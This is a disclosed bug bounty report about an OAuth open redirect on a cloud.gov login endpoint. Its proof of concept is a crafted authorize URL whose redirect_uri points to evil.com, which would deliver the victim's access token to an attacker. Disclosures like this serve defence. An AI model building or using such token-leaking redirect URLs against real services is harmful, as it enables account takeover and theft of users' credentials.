# Stealing Users OAuth Tokens through redirect_uri parameter

## Report Details
- **Report ID**: 665651
- **URL**: https://hackerone.com/reports/665651
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-08-01T21:08:15.035Z
- **Disclosed**: 2019-10-01T18:25:11.364Z

## Reporter
- **Username**: manshum12
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

Step : 
1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .

## Impact

Attacker can using this bug to stolen victim access token , that means he can takeover victim account .

## Attachments
No attachments
